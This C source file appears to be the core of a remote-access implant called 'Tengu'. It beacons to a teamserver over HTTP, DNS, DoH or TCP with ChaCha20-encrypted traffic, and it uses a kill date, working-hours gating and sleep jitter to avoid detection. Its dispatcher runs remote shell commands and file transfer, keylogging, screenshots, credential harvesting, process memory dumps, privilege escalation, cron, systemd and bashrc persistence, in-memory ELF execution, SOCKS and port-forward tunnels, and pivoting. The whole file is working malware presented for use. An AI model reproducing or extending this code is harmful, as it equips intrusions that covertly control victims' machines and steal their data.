#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include "tengu.h"

// ChaCha20 session state (declared in tengu.h as externs)
uint8_t g_chacha_key[32] = {0};
int     g_chacha_ready   = 0;

// Raw transport saved when the encryption wrapper takes over.
static c2_post_fn g_raw_c2_post = NULL;

// Wraps g_raw_c2_post: encrypts outgoing body, decrypts incoming response.
// Wire format (agent->TS): [header:12][nonce:12][chacha20(body)]
// Wire format (TS->agent): [nonce:12][chacha20(payload)]
static int encrypted_c2_post(const uint8_t* pkt, size_t pkt_len,
                              uint8_t** resp_out, size_t* resp_len_out) {
    if (pkt_len < 12 || !g_chacha_ready)
        return g_raw_c2_post(pkt, pkt_len, resp_out, resp_len_out);

    size_t body_len = pkt_len - 12;

    // Build: [header:12][nonce:12][ciphertext:body_len]
    size_t enc_len = 12 + 12 + body_len;
    uint8_t* enc = malloc(enc_len);
    if (!enc) return -1;

    // Copy header; update Size field (BE uint32 at offset 0).
    memcpy(enc, pkt, 12);
    uint32_t new_size = (uint32_t)(12 + 12 + body_len);
    enc[0] = (new_size >> 24) & 0xffu;
    enc[1] = (new_size >> 16) & 0xffu;
    enc[2] = (new_size >>  8) & 0xffu;
    enc[3] =  new_size        & 0xffu;

    // Random nonce.
    tengu_getrandom(enc + 12, 12);

    // Copy and encrypt body in place.
    memcpy(enc + 24, pkt + 12, body_len);
    chacha20_xcrypt(g_chacha_key, enc + 12, 0, enc + 24, body_len);

    // Send encrypted packet; always collect response internally.
    uint8_t* raw_resp = NULL;
    size_t   raw_len  = 0;
    int r = g_raw_c2_post(enc, enc_len, &raw_resp, &raw_len);
    free(enc);

    if (r != 0) {
        free(raw_resp);
        if (resp_out)     *resp_out     = NULL;
        if (resp_len_out) *resp_len_out = 0;
        return r;
    }

    // Decrypt response: [nonce:12][ciphertext...]
    if (raw_resp && raw_len > 12) {
        size_t ct_len = raw_len - 12;
        chacha20_xcrypt(g_chacha_key, raw_resp, 0, raw_resp + 12, ct_len);
        memmove(raw_resp, raw_resp + 12, ct_len);
        if (resp_out)     *resp_out     = raw_resp;
        if (resp_len_out) *resp_len_out = ct_len;
        if (!resp_out)    free(raw_resp);
    } else {
        if (resp_out)     *resp_out     = raw_resp;
        if (resp_len_out) *resp_len_out = raw_len;
        if (!resp_out)    free(raw_resp);
    }
    return 0;
}

static int kill_date_reached(void) {
    return g_config.kill_date != 0 && (int64_t)time(NULL) >= g_config.kill_date;
}

static int in_working_hours(void) {
    int32_t wh = g_config.working_hours;
    if (!((wh >> 22) & 1)) return 1;  // not configured -> always active

    int start_hour = (wh >> 17) & 0x1f;
    int start_min  = (wh >> 11) & 0x3f;
    int end_hour   = (wh >>  6) & 0x1f;
    int end_min    = (wh >>  0) & 0x3f;

    time_t now = time(NULL);
    struct tm* lt = localtime(&now);
    int cur_hour = lt->tm_hour;
    int cur_min  = lt->tm_min;

    if (cur_hour < start_hour || cur_hour > end_hour) return 0;
    if (cur_hour == start_hour && cur_min < start_min) return 0;
    if (cur_hour == end_hour   && cur_min > end_min)   return 0;
    return 1;
}

static unsigned int sleep_until_working_hours(void) {
    int32_t wh = g_config.working_hours;
    int start_hour = (wh >> 17) & 0x1f;
    int start_min  = (wh >> 11) & 0x3f;
    int end_hour   = (wh >>  6) & 0x1f;
    int end_min    = (wh >>  0) & 0x3f;

    time_t now = time(NULL);
    struct tm* lt = localtime(&now);
    unsigned int secs = 0;

    if (lt->tm_hour > end_hour || (lt->tm_hour == end_hour && lt->tm_min > end_min)) {
        // past end: sleep until midnight then until start
        secs += (23 - lt->tm_hour) * 3600 + (59 - lt->tm_min) * 60;
        secs += start_hour * 3600 + start_min * 60;
    } else {
        secs += (start_hour - lt->tm_hour) * 3600 + (start_min - lt->tm_min) * 60;
    }
    return secs > 0 ? secs : 60;
}

static const uint8_t s_config_bytes[] = CONFIG_BYTES;

c2_post_fn g_c2_post = NULL;

// Compute sleep time in seconds with jitter.
static unsigned int compute_sleep(int delay, int jitter) {
    if (delay <= 0)  return 1;
    if (jitter <= 0) return (unsigned int)delay;

    // jitter is a percentage (0-100).
    int spread = (delay * jitter) / 100;
    if (spread == 0) return (unsigned int)delay;
    int offset = (rand() % (2 * spread + 1)) - spread;
    int result = delay + offset;
    return (unsigned int)(result > 0 ? result : 1);
}

// Dispatch a single job received from the teamserver.
static void dispatch_job(uint32_t cmd, uint32_t req_id, Parser* p) {
    switch (cmd) {

    case COMMAND_SLEEP: {
        int delay  = (int)parser_u32le(p);
        int jitter = (int)parser_u32le(p);
        cmd_sleep(req_id, delay, jitter);
        break;
    }

    case COMMAND_EXIT:
        cmd_exit(req_id);
        exit(0);

    case TENGU_SHELL: {
        char* s = parser_str(p);
        if (s) { cmd_shell(req_id, s); free(s); }
        break;
    }

    case TENGU_PWD:
        cmd_pwd(req_id);
        break;

    case TENGU_LS: {
        char* s = parser_str(p);
        cmd_ls(req_id, s ? s : ".");
        free(s);
        break;
    }

    case TENGU_CD: {
        char* s = parser_str(p);
        if (s) { cmd_cd(req_id, s); free(s); }
        break;
    }

    case TENGU_DOWNLOAD: {
        char* s = parser_str(p);
        if (s) { cmd_download(req_id, s); free(s); }
        break;
    }

    case TENGU_UPLOAD: {
        char* remote_path = parser_str(p);
        size_t data_len = 0;
        uint8_t* data = parser_bytes(p, &data_len);
        if (remote_path) cmd_upload(req_id, remote_path, data ? data : (const uint8_t*)"", data_len);
        free(remote_path);
        free(data);
        break;
    }

    case TENGU_CAT: {
        char* s = parser_str(p);
        if (s) { cmd_cat(req_id, s); free(s); }
        break;
    }

    case TENGU_MKDIR: {
        char* s = parser_str(p);
        if (s) { cmd_mkdir(req_id, s); free(s); }
        break;
    }

    case TENGU_RM: {
        char* s = parser_str(p);
        uint32_t recursive = parser_u32le(p);
        if (s) cmd_rm(req_id, s, (int)recursive);
        free(s);
        break;
    }

    case TENGU_PS:
        cmd_ps(req_id);
        break;

    case TENGU_ID:
        cmd_id(req_id);
        break;

    case TENGU_ENV:
        cmd_env(req_id);
        break;

    case TENGU_IFCONFIG:
        cmd_ifconfig(req_id);
        break;

    case TENGU_CHMOD: {
        char* s = parser_str(p);
        uint32_t mode = parser_u32le(p);
        if (s) cmd_chmod(req_id, s, mode);
        free(s);
        break;
    }

    case TENGU_CP: {
        char* src = parser_str(p);
        char* dst = parser_str(p);
        if (src && dst) cmd_cp(req_id, src, dst);
        free(src);
        free(dst);
        break;
    }

    case TENGU_KILL: {
        uint32_t pid = parser_u32le(p);
        cmd_kill(req_id, pid);
        break;
    }

    case TENGU_SOCKS5_OPEN: {
        uint32_t conn_id = parser_u32le(p);
        char*    host    = parser_str(p);
        uint32_t port    = parser_u32le(p);
        if (host) socks5_open(conn_id, host, (uint16_t)port);
        free(host);
        break;
    }

    case TENGU_SOCKS5_DATA: {
        uint32_t conn_id = parser_u32le(p);
        size_t dlen = 0;
        uint8_t* data = parser_bytes(p, &dlen);
        socks5_send_data(conn_id, data, dlen);
        free(data);
        break;
    }

    case TENGU_SOCKS5_CLOSE: {
        uint32_t conn_id = parser_u32le(p);
        socks5_close(conn_id);
        break;
    }

    case TENGU_LS_UI: {
        char* s = parser_str(p);
        cmd_ls_json(req_id, s ? s : ".");
        free(s);
        break;
    }

    case TENGU_PS_UI: {
        cmd_ps_json(req_id);
        break;
    }

    case TENGU_BOF: {
        size_t   elf_len  = 0;
        uint8_t* elf_data = parser_bytes(p, &elf_len);
        size_t   args_len = 0;
        uint8_t* args     = parser_bytes(p, &args_len);
        if (elf_data)
            cmd_bof(req_id, elf_data, elf_len, (char*)args, (int)args_len);
        free(elf_data);
        free(args);
        break;
    }

    case TENGU_NETSTAT:
        cmd_netstat(req_id);
        break;

    case TENGU_ARP:
        cmd_arp(req_id);
        break;

    case TENGU_ROUTE:
        cmd_route(req_id);
        break;

    case TENGU_PERSIST_CRON: {
        char* path     = parser_str(p);
        char* interval = parser_str(p);
        if (path) cmd_persist_cron(req_id, path, interval ? interval : "*/5 * * * *");
        free(path);
        free(interval);
        break;
    }

    case TENGU_PERSIST_SYS: {
        char* path = parser_str(p);
        if (path) cmd_persist_systemd(req_id, path);
        free(path);
        break;
    }

    case TENGU_PERSIST_BASH: {
        char* path = parser_str(p);
        if (path) cmd_persist_bash(req_id, path);
        free(path);
        break;
    }

    case TENGU_SCREENSHOT:
        cmd_screenshot(req_id);
        break;

    case TENGU_WHOAMI: {
        char* flag = parser_str(p);
        int all = flag && strcmp(flag, "/all") == 0;
        if (flag) free(flag);
        cmd_whoami(req_id, all);
        break;
    }

    case TENGU_KEYLOG: {
        char* secs_str = parser_str(p);
        int duration = 30;
        if (secs_str) {
            duration = atoi(secs_str);
            free(secs_str);
        }
        cmd_keylog(req_id, duration);
        break;
    }

    case TENGU_HARVEST:
        cmd_harvest(req_id);
        break;

    case TENGU_MEMFD: {
        size_t   elf_len  = 0;
        uint8_t* elf_data = parser_bytes(p, &elf_len);
        char*    args     = parser_str(p);
        if (elf_data)
            cmd_memfd(req_id, elf_data, elf_len, args ? args : "");
        free(elf_data);
        free(args);
        break;
    }

    case TENGU_PORTSCAN: {
        char* target   = parser_str(p);
        char* ports    = parser_str(p);
        int   timeout  = (int)parser_u32le(p);
        if (target && ports)
            cmd_portscan(req_id, target, ports, timeout);
        free(target);
        free(ports);
        break;
    }

    case TENGU_PROCDUMP: {
        int pid = (int)parser_u32le(p);
        cmd_procdump(req_id, pid);
        break;
    }

    case TENGU_RPORTFWD_OPEN: {
        uint32_t conn_id = parser_u32le(p);
        char*    host    = parser_str(p);
        uint32_t port    = parser_u32le(p);
        if (host) rportfwd_open(conn_id, host, (uint16_t)port);
        free(host);
        break;
    }

    case TENGU_RPORTFWD_DATA: {
        uint32_t conn_id = parser_u32le(p);
        size_t   dlen    = 0;
        uint8_t* data    = parser_bytes(p, &dlen);
        rportfwd_send_data(conn_id, data, dlen);
        free(data);
        break;
    }

    case TENGU_RPORTFWD_CLOSE: {
        uint32_t conn_id = parser_u32le(p);
        rportfwd_close(conn_id);
        break;
    }

    case TENGU_PRIVESC:
        cmd_privesc(req_id);
        break;

    case TENGU_PIVOT_TCP_LISTEN: {
        uint32_t port = parser_u32le(p);
        int r = pivot_server_listen((int)port);
        const char* msg = (r == 0) ? "TCP pivot server started" : "TCP pivot server failed to start";
        Buf* out = build_output_packet(req_id, r == 0 ? COMMAND_OUTPUT : COMMAND_ERROR, msg);
        g_c2_post(out->data, out->size, NULL, NULL);
        buf_free(out);
        break;
    }

    case TENGU_PIVOT_TCP_DATA: {
        uint32_t child_id = parser_u32le(p);
        size_t   dlen     = 0;
        uint8_t* data     = parser_bytes(p, &dlen);
        if (data && dlen > 0)
            pivot_server_write(child_id, data, dlen);
        free(data);
        break;
    }

    case TENGU_PIVOT_TCP_DISCONN: {
        uint32_t child_id = parser_u32le(p);
        pivot_server_disconnect(child_id);
        break;
    }

    case COMMAND_NOJOB:
    default:
        break;
    }
}

// Process the full response body from the teamserver.
// Format: repeated [Command:4LE][RequestID:4LE][DataSize:4LE][data...]
static void process_response(const uint8_t* resp, size_t resp_len) {
    Parser p = parser_new(resp, resp_len);

    while (p.pos + 12 <= p.len) {
        uint32_t cmd      = parser_u32le(&p);
        uint32_t req_id   = parser_u32le(&p);
        uint32_t data_sz  = parser_u32le(&p);

        if (p.pos + data_sz > p.len) break;

        // Slice the data for this job.
        Parser job_parser = parser_new(p.data + p.pos, data_sz);
        p.pos += data_sz;

        dispatch_job(cmd, req_id, &job_parser);
    }
}

int main(void) {
    srand((unsigned int)time(NULL) ^ (unsigned int)getpid());

    config_parse(s_config_bytes, sizeof(s_config_bytes));

    switch (g_config.transport) {
    case 1:  g_c2_post = dns_c2_post;       break;
    case 2:  g_c2_post = doh_c2_post;       break;
    case 3:  g_c2_post = tcp_c2_post; break;
    default: g_c2_post = http_c2_post;      break;
    }

    socks5_init();
    rportfwd_init();
    pivot_server_init();

    g_agent_id = (uint32_t)rand();

    // Generate ChaCha20 session key before building the INIT packet
    // (the key is appended to the INIT body for the teamserver to store).
    tengu_getrandom(g_chacha_key, 32);

    // Send INIT packet to register with the teamserver.
    {
        Buf* pkt = build_init_packet();
        uint8_t* resp = NULL;
        size_t   resp_len = 0;

        int r = g_c2_post(pkt->data, pkt->size, &resp, &resp_len);
        buf_free(pkt);

        if (r != 0 || resp_len < 4) {
            free(resp);
            return 1;
        }

        // Server echoes back the agent ID (4B LE).
        uint32_t confirmed_id = (uint32_t)resp[0]
            | ((uint32_t)resp[1] << 8)
            | ((uint32_t)resp[2] << 16)
            | ((uint32_t)resp[3] << 24);
        g_agent_id = confirmed_id;
        free(resp);

        // Activate ChaCha20 encryption for all subsequent packets.
        g_chacha_ready = 1;
        g_raw_c2_post  = g_c2_post;
        g_c2_post      = encrypted_c2_post;
    }

    // Main beacon loop.
    for (;;) {
        if (kill_date_reached())
            exit(0);

        // No sleep when tunnels or pivot server are active - need fast polling.
        if (!socks5_active() && !rportfwd_active() && !pivot_server_active()) {
            if (!in_working_hours()) {
                sleep(sleep_until_working_hours());
                continue;
            }
            sleep_obf((unsigned int)compute_sleep(g_config.sleep_delay, g_config.sleep_jitter));
        }

        Buf*     pkt      = build_checkin_packet();
        uint8_t* resp     = NULL;
        size_t   resp_len = 0;

        int r = g_c2_post(pkt->data, pkt->size, &resp, &resp_len);
        buf_free(pkt);

        if (r == 0 && resp_len > 0) {
            process_response(resp, resp_len);
            free(resp);
        }

        // Drain any data pending on active tunnels.
        socks5_collect_data();
        rportfwd_collect_data();

        // Relay any child frames from the TCP pivot server.
        {
            size_t pivot_resp_len = 0;
            uint8_t* pivot_resp = pivot_server_collect_ex(&pivot_resp_len);
            if (pivot_resp && pivot_resp_len > 0) {
                process_response(pivot_resp, pivot_resp_len);
                free(pivot_resp);
            }
        }
    }

    return 0;
}
